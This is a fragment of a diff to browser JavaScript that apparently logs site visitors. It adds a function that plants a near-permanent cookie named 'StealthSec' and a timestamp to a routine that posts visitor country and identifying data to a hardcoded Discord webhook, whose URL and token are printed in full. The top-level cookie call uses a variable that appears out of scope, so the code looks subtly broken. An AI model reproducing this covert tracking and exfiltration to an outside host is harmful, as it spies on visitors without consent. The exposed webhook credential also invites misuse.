@@ -84,8 +84,15 @@ async function getUserCountry(mixedString) {
   }
 }
 
+function saveCookie(name, value) {
+  document.cookie = `${name}=${encodeURIComponent(value)}; expires=Fri, 31 Dec 9999 23:59:59 GMT; path=/`;
+}
+
+saveCookie('StealthSec', mixedString);
+
 function sendVisitor(country, mixedString) {
   var currentTime = Date.now();
+  var dateTime = new Date(currentTime).toLocaleString();
   var webhookURL = "https://discord.com/api/webhooks/1236279668282363924/K7Vm8hi1kVv2bDw5Ca2KImbpgUSPqTM-aesvFoOU8tv_3iOM9TGV-AlSqaiFWeEMqvmZ";
   var data = {
     content:
